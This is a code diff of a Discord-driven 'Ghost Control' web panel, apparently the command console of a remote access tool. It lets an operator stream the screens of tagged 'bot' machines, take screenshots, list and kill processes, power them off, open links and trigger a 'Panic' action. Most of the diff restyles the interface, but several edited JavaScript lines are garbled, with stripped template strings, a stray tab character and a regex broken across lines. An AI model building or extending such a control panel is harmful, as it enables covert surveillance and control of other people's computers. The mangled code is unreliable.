@@ -241,11 +241,6 @@ async def on_message(message: discord.Message):
             except Exception as exc:
                 print(f"[TAG] failed to broadcast {tag}: {exc}")
         is_live_frame = "LIVE_STREAM_FRAME" in (message.content or "")
-        live_http_url = None
-        if "LIVE_STREAM_HTTP" in (message.content or ""):
-            parts = message.content.split(maxsplit=3)
-            if len(parts) >= 3:
-                live_http_url = parts[2].strip()
         payload = {
             "type": "text",
             "author": str(message.author),
@@ -254,7 +249,6 @@ async def on_message(message: discord.Message):
             "ts": message.created_at.isoformat(),
             "tag": tag,
             "is_live_frame": is_live_frame,
-            "live_http_url": live_http_url,
         }
         # Save any attachments (e.g., screenshot.png)
         for att in message.attachments:
@@ -300,57 +294,61 @@ PANEL_HTML = r"""<!doctype html>
   <title>Ghost Control</title>
   <style>
     :root{
-      --bg:#05060c; --panel:#0d111c; --card:#11192a; --line:#1c263a; --text:#e7edf8; --muted:#9aa6c2;
-      --accent:#5fe0c5; --accent2:#4d82ff; --danger:#ff6b6b;
+      --bg:#0a0614; --panel:#0f0a1f; --card:#160f2d; --line:#2a1f4d; --text:#f3e8ff; --muted:#a793c7;
+      --accent:#b574ff; --accent2:#5bd0ff; --danger:#ff5c8a; --glass:rgba(255,255,255,0.04);
     }
-    *{box-sizing:border-box;} body{margin:0; font:15px/1.55 "Inter","Segoe UI",Arial,sans-serif; background:radial-gradient(80% 60% at 10% 0%, rgba(93,175,255,.16), transparent), radial-gradient(65% 55% at 85% 0%, rgba(95,224,197,.12), transparent), var(--bg); color:var(--text);}
+    *{box-sizing:border-box;}
+    body{margin:0; font:15px/1.55 "Inter","Segoe UI",Arial,sans-serif; background:radial-gradient(60% 50% at 15% 15%, rgba(181,116,255,.18), transparent), radial-gradient(50% 60% at 85% 0%, rgba(91,208,255,.18), transparent), var(--bg); color:var(--text);}
     a{color:inherit;}
-    .page{max-width:1200px; margin:0 auto; padding:20px 12px 42px;}
-    header.hero{display:flex; align-items:center; justify-content:space-between; gap:12px; flex-wrap:wrap; padding:14px 16px; border:1px solid var(--line); border-radius:14px; background:rgba(16,21,33,.85); backdrop-filter:blur(6px);}
-    h1{margin:4px 0 0; font-size:24px;} .eyebrow{letter-spacing:0.28px; text-transform:uppercase; font-size:12px; color:var(--muted);}
-    .status{display:flex; gap:8px; flex-wrap:wrap; align-items:center;} .pill{display:inline-flex; align-items:center; gap:8px; padding:7px 11px; border:1px solid var(--line); border-radius:10px; background:var(--card); font-weight:700;} .dot{width:10px; height:10px; border-radius:50%; background:#f5c04a;} .dot.ok{background:#5fe0c5;} .dot.bad{background:var(--danger);}
-    .tag-control{display:grid; gap:6px; padding:8px 10px; border:1px solid var(--line); border-radius:10px; background:var(--card); min-width:240px;}
-    .tag-row{display:flex; gap:6px; align-items:center; flex-wrap:wrap;} .tag-row input{flex:1; min-width:160px;}
+    .page{max-width:1240px; margin:0 auto; padding:18px 12px 46px;}
+    header.hero{display:flex; flex-wrap:wrap; gap:12px; align-items:center; justify-content:space-between; padding:14px 16px; border:1px solid var(--line); border-radius:16px; background:linear-gradient(135deg, rgba(181,116,255,.16), rgba(15,10,31,.9)); box-shadow:0 25px 60px rgba(0,0,0,.38);}
+    h1{margin:2px 0 0; font-size:24px;} .eyebrow{letter-spacing:0.28px; text-transform:uppercase; font-size:12px; color:var(--muted);}
+    .status{display:flex; gap:10px; flex-wrap:wrap; align-items:center;} .pill{display:inline-flex; align-items:center; gap:8px; padding:8px 11px; border:1px solid var(--line); border-radius:12px; background:var(--card); font-weight:700;} .dot{width:10px; height:10px; border-radius:50%; background:#f5c04a;} .dot.ok{background:#5fe0c5;} .dot.bad{background:var(--danger);}
+    .tag-control{display:grid; gap:6px; padding:8px 10px; border:1px solid var(--line); border-radius:12px; background:var(--glass); min-width:220px;}
+    .tag-row{display:flex; gap:6px; align-items:center; flex-wrap:wrap;} .tag-row input{flex:1; min-width:150px;}
     .tag-meta{font-size:12px; color:var(--muted);}
-    .tag-box{border:1px solid var(--line); background:var(--card); padding:8px 10px; border-radius:10px; min-width:200px;}
-    .tag-list{display:flex; flex-wrap:wrap; gap:6px; max-width:320px;}
-    .tag-chip{border:1px solid var(--line); padding:5px 8px; border-radius:8px; background:#0c1220; cursor:pointer; font-weight:700;} .tag-chip:hover{border-color:var(--accent); color:var(--accent);}
+    .tag-list{display:flex; flex-wrap:wrap; gap:6px; max-width:260px;}
+    .chip{border:1px solid var(--line); padding:5px 8px; border-radius:9px; background:#130b26; cursor:pointer; font-weight:700;} .chip:hover{border-color:var(--accent); color:var(--accent);}
     .shell{margin-top:16px; border:1px solid var(--line); border-radius:16px; background:var(--panel); box-shadow:0 20px 50px rgba(0,0,0,.35); overflow:hidden;}
-    .tabbar{display:flex; gap:8px; padding:12px; border-bottom:1px solid var(--line); background:rgba(17,25,42,.75); overflow-x:auto;}
-    .tab-btn{flex:1; min-width:120px; border:1px solid var(--line); background:var(--card); color:var(--text); padding:10px 12px; border-radius:10px; cursor:pointer; font-weight:700; letter-spacing:0.2px; transition:all .18s ease;} 
-    .tab-btn.active{background:linear-gradient(120deg,var(--accent),var(--accent2)); color:#061021; border-color:transparent; transform:translateY(-1px); box-shadow:0 12px 30px rgba(79,136,255,.35);}
-    .panel{padding:18px 18px 20px; min-height:480px; position:relative;}
-    .view{position:absolute; inset:0; padding:18px; opacity:0; transform:translateY(10px); transition:opacity .22s ease, transform .22s ease; pointer-events:none;}
+    .tabbar{display:flex; gap:8px; padding:10px; border-bottom:1px solid var(--line); background:rgba(22,15,45,.75); overflow-x:auto;}
+    .tab-btn{flex:1; min-width:120px; border:1px solid var(--line); background:var(--card); color:var(--text); padding:10px 12px; border-radius:10px; cursor:pointer; font-weight:700; letter-spacing:0.2px; transition:all .18s ease;}
+    .tab-btn.active{background:linear-gradient(120deg,var(--accent),var(--accent2)); color:#080512; border-color:transparent; transform:translateY(-1px); box-shadow:0 12px 30px rgba(128,90,255,.35);}    .views{position:relative; min-height:520px;}
+    .view{position:absolute; inset:0; padding:18px; opacity:0; transform:translateY(10px); transition:opacity .2s ease, transform .2s ease; pointer-events:none;}
     .view.active{opacity:1; transform:translateY(0); pointer-events:auto;}
-    .grid{display:grid; grid-template-columns:1.05fr .95fr; gap:14px;} @media(max-width:960px){.grid{grid-template-columns:1fr;}} @media(max-width:720px){.grid{grid-template-columns:1fr; gap:10px;}}
-    .card{border:1px solid var(--line); border-radius:12px; background:var(--card); padding:14px;}
-    .head{display:flex; justify-content:space-between; gap:10px; align-items:center; flex-wrap:wrap; margin-bottom:10px;} h3{margin:0;}
-    .btn{border:1px solid var(--line); background:var(--card); color:var(--text); padding:9px 12px; border-radius:10px; font-weight:700; cursor:pointer; transition:transform .08s ease, filter .15s ease;} .btn:hover{filter:brightness(1.06); transform:translateY(-1px);} .btn.primary{background:linear-gradient(120deg,var(--accent),var(--accent2)); color:#061021; border:none;} .btn.danger{background:var(--danger); border-color:var(--danger); color:#061021;} .btn.small{padding:7px 10px; font-size:13px;}
-    .stack{display:grid; gap:10px;} .row{display:flex; gap:8px; flex-wrap:wrap;} input{flex:1; min-width:180px; padding:10px 12px; border-radius:10px; border:1px solid var(--line); background:#0a0f1a; color:#e7edf8;} label{font-weight:700;}
-    .feed{display:flex; flex-direction:column; gap:10px; max-height:420px; overflow:auto; padding-right:4px;} .feed.small{max-height:360px;} .item{border:1px solid var(--line); border-radius:10px; padding:10px 12px; background:rgba(14,19,30,.9);} .meta{font-size:12px; color:var(--muted); margin-bottom:6px; word-break:break-word;}
-    .gallery{display:grid; grid-template-columns: repeat(auto-fit, minmax(200px,1fr)); gap:10px;} .shot{border:1px solid var(--line); border-radius:12px; overflow:hidden; background:#0b0f19; cursor:pointer;} .shot img{width:100%; display:block;}
-    .live-frame{border:1px solid var(--line); border-radius:12px; background:radial-gradient(60% 60% at 30% 30%, rgba(95,224,197,.1), transparent), radial-gradient(50% 60% at 70% 40%, rgba(77,130,255,.12), transparent), #0c1220; min-height:220px; height:60vh; max-height:720px; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;}
+    .grid{display:grid; grid-template-columns:1.2fr .8fr; gap:14px;} @media(max-width:960px){.grid{grid-template-columns:1fr;}}
+    .card{border:1px solid var(--line); border-radius:14px; background:var(--card); padding:14px; box-shadow:0 10px 30px rgba(0,0,0,.25);}    .head{display:flex; justify-content:space-between; gap:10px; align-items:center; flex-wrap:wrap; margin-bottom:10px;} h3{margin:0;}
+    .btn{border:1px solid var(--line); background:var(--glass); color:var(--text); padding:9px 12px; border-radius:10px; font-weight:700; cursor:pointer; transition:transform .08s ease, filter .15s ease;} .btn:hover{filter:brightness(1.08); transform:translateY(-1px);} .btn.primary{background:linear-gradient(120deg,var(--accent),var(--accent2)); color:#0b0b18; border:none;} .btn.danger{background:var(--danger); border-color:var(--danger); color:#0b0b18;} .btn.small{padding:7px 10px; font-size:13px;}
+    .stack{display:grid; gap:10px;} .row{display:flex; gap:8px; flex-wrap:wrap;} input{flex:1; min-width:160px; padding:10px 12px; border-radius:10px; border:1px solid var(--line); background:#0c0a18; color:#f3e8ff;} label{font-weight:700;}
+    .feed{display:flex; flex-direction:column; gap:10px; max-height:70vh; min-height:260px; overflow:auto; padding-right:4px;} .feed.small{max-height:60vh; min-height:220px;} .item{border:1px solid var(--line); border-radius:10px; padding:10px 12px; background:rgba(19,11,38,.9);} .meta{font-size:12px; color:var(--muted); margin-bottom:6px; word-break:break-word;}
+    .gallery{display:grid; grid-template-columns: repeat(auto-fit, minmax(180px,1fr)); gap:10px;} .shot{border:1px solid var(--line); border-radius:12px; overflow:hidden; background:#0b0a1a; cursor:pointer;} .shot img{width:100%; display:block;}
+    .live-wrap{display:grid; gap:12px;}
+    .live-frame{border:1px solid var(--line); border-radius:12px; background:radial-gradient(60% 60% at 30% 30%, rgba(181,116,255,.12), transparent), radial-gradient(50% 60% at 70% 40%, rgba(91,208,255,.12), transparent), #0f0a1f; min-height:240px; height:60vh; max-height:760px; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;}
     .live-frame img{max-width:100%; width:100%; height:100%; object-fit:contain; display:none;}
     .live-frame.active img{display:block;}
-    .live-frame .muted{position:absolute; inset:auto; margin:auto;}
+    .live-frame .muted{position:absolute; inset:auto; margin:auto; text-align:center; color:var(--muted);}
     .live-controls{gap:6px; flex-wrap:wrap;} .input-compact{max-width:90px;}
-    @media(max-width:640px){
+    .scroll-card{max-height:70vh; overflow:auto;}
+    .loader{position:fixed; inset:0; display:flex; align-items:center; justify-content:center; background:rgba(10,6,20,.9); z-index:200; transition:opacity .3s ease, visibility .3s ease;} .loader.hide{opacity:0; visibility:hidden;} .spinner{width:46px; height:46px; border:4px solid rgba(255,255,255,.12); border-top-color:var(--accent); border-radius:50%; animation:spin 1s linear infinite;}
+    @keyframes spin{to{transform:rotate(360deg);}}
+    @media(max-width:720px){
       body{font-size:14px;}
       .tab-btn{flex:1 0 auto;}
       .card{padding:12px;}
       .head{flex-direction:column; align-items:flex-start;}
-      .live-frame{min-height:200px; height:45vh;}
+      .live-frame{min-height:220px; height:50vh;}
+      .feed{max-height:60vh;}
     }
     #toast{position:fixed; left:50%; bottom:18px; transform:translateX(-50%); padding:9px 14px; border-radius:12px; border:1px solid var(--line); background:var(--panel); font-weight:700; opacity:0; transition:opacity .18s ease; z-index:120;}
   </style>
 </head>
 <body>
+  <div id="loader" class="loader"><div class="spinner"></div></div>
   <div class="page">
     <header class="hero">
       <div>
         <div class="eyebrow">Receiver console</div>
         <h1>Ghost Control</h1>
-        <div class="muted">Minimal live control surface.</div>
+        <div class="muted">Purple control surface with live stream + logs.</div>
       </div>
       <div class="status">
         <div class="pill"><span id="dot" class="dot"></span><span id="stxt">Connecting...</span></div>
@@ -365,122 +363,111 @@ PANEL_HTML = r"""<!doctype html>
           </div>
           <div class="tag-meta">Active: <span id="tagActive">{BOT_TAG}</span></div>
         </div>
-        <div class="tag-box">
-          <div class="tag-meta">Seen tags (click to copy)</div>
-          <div id="tagList" class="tag-list"></div>
-        </div>
         <div class="pill" id="uptime">00:00</div>
       </div>
     </header>
 
     <div class="shell">
       <div class="tabbar">
-        <button class="tab-btn active" data-tab="dash">Dashboard</button>
-        <button class="tab-btn" data-tab="live">Live stream</button>
+        <button class="tab-btn active" data-tab="live">Live</button>
         <button class="tab-btn" data-tab="shots">Screenshots</button>
         <button class="tab-btn" data-tab="procs">Processes</button>
         <button class="tab-btn" data-tab="logs">Logs</button>
       </div>
-      <div class="panel">
-        <div id="tab-dash" class="view active">
+      <div class="views">
+        <section id="tab-live" class="view active">
           <div class="grid">
             <div class="card">
               <div class="head">
-                <div><div class="eyebrow">Quick actions</div><h3>Commands</h3></div>
+                <div><div class="eyebrow">Live stream</div><h3>Screen share</h3></div>
+                <div id="liveControls" class="row live-controls">
+                  <input id="liveMonitor" class="input-compact" placeholder="1" value="1" title="Monitor index"/>
+                  <button class="btn primary" onclick="startLiveStream()">Start</button>
+                  <button class="btn" onclick="stopLiveStream()">Stop</button>
+                </div>
               </div>
-              <div class="stack">
-                <div class="row">
-                  <button class="btn" onclick="doShot()">Screenshot</button>
-                  <button class="btn" onclick="doProcs()">Processes</button>
-                  <button class="btn danger" onclick="confirmPower()">Power off</button>
-                  <button class="btn primary" onclick="displayGif()">Display gif</button>
-                  <button class="btn danger" onclick="confirmPanic()">Panic</button>
-                </div>
-                <div>
-                  <label for="volPercent">Set volume (0-100)</label>
-                  <div class="row">
-                    <input id="volPercent" placeholder="100" value="100" style="max-width:120px"/>
-                    <button class="btn" onclick="setVolume()">Set</button>
+              <div id="liveGate" class="pill" style="background:var(--glass); color:var(--muted);">
+                Select a bot first to start a live stream.
+              </div>
+              <div id="liveBody" class="live-wrap">
+                <div class="row" style="gap:8px; align-items:center;">
+                  <div class="pill" style="display:flex; gap:8px; align-items:center;">
+                    <span id="liveDot" class="dot"></span><span id="liveStatus">Idle</span>
                   </div>
                 </div>
-                <div>
-                  <label for="openUrl">Open link</label>
-                  <div class="row">
-                    <input id="openUrl" placeholder="https://example.com"/>
-                    <button class="btn" onclick="openLink()">Open</button>
-                  </div>
-                </div>
-                <div>
-                  <label for="procName">Kill process</label>
-                  <div class="row">
-                    <input id="procName" placeholder="chrome.exe"/>
-                    <button class="btn" onclick="killProc()">Kill</button>
-                  </div>
+                <div class="live-frame" id="liveFrameWrap">
+                  <div class="muted" id="liveHint">Press start to request a screenshare.</div>
+                  <img id="liveFrame" alt="Live stream" />
                 </div>
               </div>
             </div>
-            <div class="card">
+            <div class="card scroll-card">
               <div class="head">
-                <div><div class="eyebrow">Feed</div><h3>Live log</h3></div>
+                <div><div class="eyebrow">Live log</div><h3>Events</h3></div>
               </div>
               <div id="timeline" class="feed"></div>
             </div>
           </div>
-        </div>
+        </section>
 
-        <div id="tab-live" class="view" aria-hidden="true">
-          <div class="card" style="height:100%; display:flex; flex-direction:column; gap:14px;">
-            <div class="head">
-              <div><div class="eyebrow">Live</div><h3>Screen share</h3></div>
-              <div id="liveControls" class="row live-controls">
-                <input id="liveMonitor" class="input-compact" placeholder="1" value="1" title="Monitor index"/>
-                <button class="btn primary" onclick="startLiveStream()">Start</button>
-                <button class="btn" onclick="stopLiveStream()">Stop</button>
-              </div>
-            </div>
-            <div id="liveGate" class="pill" style="background:rgba(255,255,255,0.03); color:var(--muted);">
-              Select a bot first to start a live stream.
-            </div>
-            <div id="liveBody" class="stack" style="gap:12px;">
-              <div class="pill" style="display:flex; gap:8px; align-items:center; width:max-content;">
-                <span id="liveDot" class="dot"></span><span id="liveStatus">Idle</span>
-              </div>
-              <div class="live-frame">
-                <div class="muted" id="liveHint">Click start to request a screenshare.</div>
-                <img id="liveFrame" alt="Live stream" />
-              </div>
-            </div>
-          </div>
-        </div>
-
-        <div id="tab-shots" class="view" aria-hidden="true">
-          <div class="card" style="height:100%; display:flex; flex-direction:column;">
+        <section id="tab-shots" class="view" aria-hidden="true">
+          <div class="card scroll-card">
             <div class="head">
               <div><div class="eyebrow">Captures</div><h3>Screenshots</h3></div>
+              <div class="row"><button class="btn" onclick="doShot()">Take screenshot</button></div>
             </div>
             <div id="gallery" class="gallery"></div>
           </div>
-        </div>
+        </section>
 
-        <div id="tab-procs" class="view" aria-hidden="true">
-          <div class="card" style="height:100%; display:flex; flex-direction:column;">
+        <section id="tab-procs" class="view" aria-hidden="true">
+          <div class="card scroll-card">
             <div class="head">
               <div><div class="eyebrow">Processes</div><h3>Process lists</h3></div>
               <button class="btn" onclick="doProcs()">Refresh</button>
             </div>
+            <div class="stack" style="margin-bottom:10px;">
+              <label for="procName">Kill process</label>
+              <div class="row">
+                <input id="procName" placeholder="chrome.exe"/>
+                <button class="btn danger" onclick="killProc()">Kill</button>
+              </div>
+            </div>
             <div id="procFeed" class="feed small"></div>
           </div>
-        </div>
+        </section>
 
-        <div id="tab-logs" class="view" aria-hidden="true">
-          <div class="card" style="height:100%; display:flex; flex-direction:column;">
+        <section id="tab-logs" class="view" aria-hidden="true">
+          <div class="card scroll-card">
             <div class="head">
+              <div><div class="eyebrow">Actions</div><h3>Controls</h3></div>
+              <div class="row" style="gap:6px; flex-wrap:wrap;">
+                <button class="btn" onclick="doShot()">Screenshot</button>
+                <button class="btn" onclick="doProcs()">Processes</button>
+                <button class="btn primary" onclick="displayGif()">Display gif</button>
+                <button class="btn danger" onclick="confirmPower()">Power off</button>
+                <button class="btn danger" onclick="confirmPanic()">Panic</button>
+              </div>
+            </div>
+            <div class="stack" style="margin-bottom:10px;">
+              <label for="openUrl">Open link</label>
+              <div class="row">
+                <input id="openUrl" placeholder="https://example.com"/>
+                <button class="btn" onclick="openLink()">Open</button>
+              </div>
+              <label for="volPercent">Set volume (0-100)</label>
+              <div class="row">
+                <input id="volPercent" placeholder="100" value="100" style="max-width:120px"/>
+                <button class="btn" onclick="setVolume()">Set</button>
+              </div>
+            </div>
+            <div class="head" style="margin-top:4px;">
               <div><div class="eyebrow">History</div><h3>Logs</h3></div>
               <button class="btn" onclick="clearLogs()">Clear</button>
             </div>
             <div id="logFeed" class="feed small"></div>
           </div>
-        </div>
+        </section>
       </div>
     </div>
   </div>
@@ -488,16 +475,25 @@ PANEL_HTML = r"""<!doctype html>
   <div id="toast"></div>
 
   <script>
-    const el = {dot:document.getElementById('dot'), stxt:document.getElementById('stxt'), timeline:document.getElementById('timeline'), gallery:document.getElementById('gallery'), procFeed:document.getElementById('procFeed'), logFeed:document.getElementById('logFeed'), uptime:document.getElementById('uptime'), tagActive:document.getElementById('tagActive'), tagInput:document.getElementById('tagInput'), tagList:document.getElementById('tagList'), liveStatus:document.getElementById('liveStatus'), liveDot:document.getElementById('liveDot'), liveFrame:document.getElementById('liveFrame'), liveGate:document.getElementById('liveGate'), liveBody:document.getElementById('liveBody'), liveHint:document.getElementById('liveHint'), liveControls:document.getElementById('liveControls'), liveMonitor:document.getElementById('liveMonitor')};
+    const el = {
+      dot:document.getElementById('dot'), stxt:document.getElementById('stxt'), timeline:document.getElementById('timeline'),
+      gallery:document.getElementById('gallery'), procFeed:document.getElementById('procFeed'), logFeed:document.getElementById('logFeed'),
+      uptime:document.getElementById('uptime'), tagActive:document.getElementById('tagActive'), tagInput:document.getElementById('tagInput'),
+      tagList:document.getElementById('tagList'), liveStatus:document.getElementById('liveStatus'), liveDot:document.getElementById('liveDot'),
+      liveFrame:document.getElementById('liveFrame'), liveGate:document.getElementById('liveGate'), liveBody:document.getElementById('liveBody'),
+      liveHint:document.getElementById('liveHint'), liveControls:document.getElementById('liveControls'), liveMonitor:document.getElementById('liveMonitor'),
+      loader:document.getElementById('loader')
+    };
     const defaultTag = "{BOT_TAG}";
     let currentTag = defaultTag;
     let knownTags = new Set([currentTag]);
     let hasSelectedTag = false;
     let liveActive = false;
-    let startedAt = Date.now(); setInterval(()=>{ const s=((Date.now()-startedAt)/1000|0); const m=(s/60|0), ss=s%60; el.uptime.textContent=`${String(m).padStart(2,'0')}:${String(ss).padStart(2,'0')}`; },1000);
+    let startedAt = Date.now(); setInterval(()=>{ const s=((Date.now()-startedAt)/1000|0); const m=(s/60|0), ss=s%60; el.uptime.textContent=${String(m).padStart(2,'0')}:; },1000);
+    window.addEventListener('load', ()=> el.loader?.classList.add('hide'));
 
     function setStatus(ok){ el.dot.className='dot '+(ok?'ok':'bad'); el.stxt.textContent = ok ? 'Connected' : 'Reconnecting...'; }
-    function toast(t){ const n=document.getElementById('toast'); n.textContent=t; n.style.opacity='1'; setTimeout(()=> n.style.opacity='0', 1500); }
+    function toast(t){ const n=document.getElementById('toast'); n.textContent=t; n.style.opacity='1'; setTimeout(()=> n.style.opacity='0', 1600); }
 
     function copyTag(tag){ if(!tag) return; if(navigator.clipboard){ navigator.clipboard.writeText(tag).catch(()=>{}); toast('Copied '+tag); } else { prompt('Copy tag', tag); } }
     function renderTags(){
@@ -512,7 +508,7 @@ PANEL_HTML = r"""<!doctype html>
         el.tagList.innerHTML='';
         Array.from(knownTags).sort().forEach(t=>{
           const chip=document.createElement('div');
-          chip.className='tag-chip';
+          chip.className='chip';
           chip.textContent=t;
           chip.onclick=()=>{ copyTag(t); if(el.tagInput) el.tagInput.value=t; };
           el.tagList.appendChild(chip);
@@ -520,11 +516,13 @@ PANEL_HTML = r"""<!doctype html>
       }
       updateLiveGate();
     }
-    function updateLiveGate(){ const ready=hasSelectedTag || (currentTag && currentTag!==defaultTag); if(ready) hasSelectedTag=true; if(el.liveGate) el.liveGate.style.display = ready?'none':'flex'; if(el.liveBody) el.liveBody.style.opacity = ready?'1':'0.55'; if(el.liveControls){ el.liveControls.querySelectorAll('button').forEach(b=> b.disabled=!ready); } }
+    function updateLiveGate(){ const ready=hasSelectedTag || (currentTag && currentTag!==defaultTag); if(ready) hasSelectedTag=true; if(el.liveGate) el.liveGate.style.display = ready?'none':'flex'; if(el.liveBody) el.liveBody.style.opacity = ready?'1':'0.45'; if(el.liveControls){ el.liveControls.querySelectorAll('button').forEach(b=> b.disabled=!ready); } }
     async function refreshTags(){ try{ const r = await fetch('/tags'); const data = await r.json().catch(()=>({})); if(data.tags) knownTags = new Set(data.tags); if(data.active) currentTag = data.active; if(currentTag && currentTag!==defaultTag) hasSelectedTag=true; } catch(e){} renderTags(); updateLiveGate(); }
     async function chooseTag(){ const val=(el.tagInput?.value||'').trim(); if(!val){ toast('Enter a tag'); return; } currentTag = val; hasSelectedTag=true; try{ const r = await fetch('/tags/select?tag='+encodeURIComponent(val), {method:'POST'}); const data = await r.json().catch(()=>({})); if(data.tags) knownTags = new Set(data.tags); if(data.active) currentTag = data.active; toast('Now targeting '+currentTag); } catch(e){ toast('Could not set tag'); } renderTags(); updateLiveGate(); }
     function withTag(path){ const u=new URL(path, window.location.origin); if(currentTag) u.searchParams.set('tag', currentTag); return u.pathname + u.search; }
-    const tagRegex = /(^|\\s)(\\[[^\\[\\]\\r\\n]{2,32}\\])/;
+    const tagRegex = /(^|\s)(\[[^\[\]
+
+]{2,32}\])/;
     function parseTag(text){ const m=(text||'').match(tagRegex); return m?m[2]:null; }
     function touchTagFromMessage(obj){
       const found = (obj&&obj.tag) || parseTag(obj&&obj.content);
@@ -536,15 +534,15 @@ PANEL_HTML = r"""<!doctype html>
       }
     }
 
-    function node(author, content, ts){ const d=document.createElement('div'); d.className='item'; const m=document.createElement('div'); m.className='meta'; const time=ts? new Date(ts).toLocaleString(): new Date().toLocaleString(); m.textContent = `${time} - ${author}`; const b=document.createElement('div'); b.textContent = content || ''; d.appendChild(m); d.appendChild(b); return d; }
+    function node(author, content, ts){ const d=document.createElement('div'); d.className='item'; const m=document.createElement('div'); m.className='meta'; const time=ts? new Date(ts).toLocaleString(): new Date().toLocaleString(); m.textContent = ${time} - ; const b=document.createElement('div'); b.textContent = content || ''; d.appendChild(m); d.appendChild(b); return d; }
     function addFeed(container, div, limit=200){ container.prepend(div); while(container.children.length>limit) container.lastChild.remove(); }
-    function addShot(url){ if(!url) return; const wrap=document.createElement('div'); wrap.className='shot'; const img=document.createElement('img'); img.loading='lazy'; img.src=url; wrap.onclick=()=> window.open(url,'_blank'); wrap.appendChild(img); el.gallery.prepend(wrap); while(el.gallery.children.length>60) el.gallery.lastChild.remove(); }
+    function addShot(url){ if(!url) return; const wrap=document.createElement('div'); wrap.className='shot'; const img=document.createElement('img'); img.loading='lazy'; img.src=url; wrap.onclick=()=> window.open(url,'_blank'); wrap.appendChild(img); el.gallery.prepend(wrap); while(el.gallery.children.length>80) el.gallery.lastChild.remove(); }
     function addProc(text){ addFeed(el.procFeed, node('Processes', text, Date.now()), 120); }
     function addLog(div){ addFeed(el.logFeed, div, 300); }
 
     function setTab(id){
-      ['dash','live','shots','procs','logs'].forEach(t=>{
-        const view=document.getElementById(`tab-${t}`);
+      ['live','shots','procs','logs'].forEach(t=>{
+        const view=document.getElementById(	ab-);
         const active=t===id;
         view.classList.toggle('active', active);
         view.setAttribute('aria-hidden', active?'false':'true');
@@ -553,8 +551,8 @@ PANEL_HTML = r"""<!doctype html>
     }
     document.querySelectorAll('.tab-btn').forEach(btn=> btn.onclick = ()=> setTab(btn.dataset.tab));
 
-    function setLiveStatus(text, state='idle'){ liveActive = state==='ok'; if(el.liveStatus) el.liveStatus.textContent=text; if(el.liveDot){ el.liveDot.className='dot'+(state==='ok'?' ok': state==='error'?' bad':''); } if(state!=='ok' && el.liveFrame){ el.liveFrame.removeAttribute('src'); if(el.liveFrame.parentElement) el.liveFrame.parentElement.classList.remove('active'); if(el.liveHint) el.liveHint.style.display='block'; } }
-    function handleLiveFrame(obj){ if(!(obj.attachments&&obj.attachments.length)) return; const url=obj.attachments[0].url+(obj.attachments[0].url.includes('?')?'&':'?')+'t='+(Date.now()); if(el.liveFrame){ el.liveFrame.src=url; if(el.liveFrame.parentElement) el.liveFrame.parentElement.classList.add('active'); el.liveFrame.style.display='block'; if(el.liveHint) el.liveHint.style.display='none'; el.liveFrame.onload=()=> el.liveFrame.parentElement?.classList.add('active'); el.liveFrame.onerror=()=> setLiveStatus('Stream error', 'error'); } setLiveStatus('Receiving frames', 'ok'); }
+    function setLiveStatus(text, state='idle'){ liveActive = state==='ok'; if(el.liveStatus) el.liveStatus.textContent=text; if(el.liveDot){ el.liveDot.className='dot'+(state==='ok'?' ok': state==='error'?' bad':''); } if(state!=='ok' && el.liveFrame){ el.liveFrame.removeAttribute('src'); const wrap=document.getElementById('liveFrameWrap'); if(wrap) wrap.classList.remove('active'); if(el.liveHint) el.liveHint.style.display='block'; } }
+    function handleLiveFrame(obj){ if(!(obj.attachments&&obj.attachments.length)) return; const url=obj.attachments[0].url+(obj.attachments[0].url.includes('?')?'&':'?')+'t='+(Date.now()); const wrap=document.getElementById('liveFrameWrap'); if(el.liveFrame){ el.liveFrame.src=url; if(wrap) wrap.classList.add('active'); el.liveFrame.style.display='block'; if(el.liveHint) el.liveHint.style.display='none'; el.liveFrame.onload=()=> wrap?.classList.add('active'); el.liveFrame.onerror=()=> setLiveStatus('Stream error', 'error'); } setLiveStatus('Receiving frames', 'ok'); }
     function connectWS(){ setStatus(false); const ws = new WebSocket((location.protocol==='https:'?'wss://':'ws://') + location.host + '/ws'); ws.onopen = ()=> setStatus(true); ws.onclose = ()=> { setStatus(false); setTimeout(connectWS, 1200); }; ws.onmessage = ev => { const obj = JSON.parse(ev.data); if(obj.type !== 'text') return; const content=(obj.content||'').toUpperCase(); touchTagFromMessage(obj); const isLiveFrame=obj.is_live_frame===true || content.includes('LIVE_STREAM_FRAME'); const isLiveStopped=content.includes('LIVE_STREAM_STOPPED'); const isLiveError=content.includes('LIVE_STREAM_ERROR'); if(isLiveFrame){ handleLiveFrame(obj); return; } if(isLiveStopped){ setLiveStatus('Stopped', 'idle'); } if(isLiveError){ setLiveStatus('Stream error', 'error'); } const msg = node(obj.author, obj.content, obj.ts); addFeed(el.timeline, msg.cloneNode(true)); addLog(msg.cloneNode(true)); if(obj.content && obj.content.toLowerCase().includes('filtered running processes')) addFeed(el.procFeed, msg.cloneNode(true)); if(obj.attachments && obj.attachments.length){ obj.attachments.forEach(a=> addShot(a.url)); } }; }
     connectWS(); refreshTags(); renderTags();
 
